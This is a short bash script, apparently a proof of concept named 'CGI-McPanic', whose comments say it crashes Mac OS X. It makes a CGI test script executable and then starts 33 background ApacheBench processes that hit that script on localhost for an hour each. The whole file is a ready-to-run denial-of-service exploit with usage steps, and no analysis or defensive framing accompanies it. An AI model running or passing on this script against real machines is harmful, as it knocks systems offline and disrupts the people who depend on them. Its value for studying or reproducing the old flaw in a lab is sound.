#!/bin/bash
#
# CGI-McPanic: script to crash MacOS X with 
#              concurrent calls to a CGI-Script
#
# before use, do:
# 
# chmod a+x /Local/Library/WebServer/CGI-Executables/test-cgi
#
# then call
#
# bash ./CGI-McPanic
#

NUMPROC=32
i=0

while [ $i -le $NUMPROC ]
do
    i=$[$i + 1]
    ab -t 3600 http://localhost/cgi-bin/test-cgi &
done

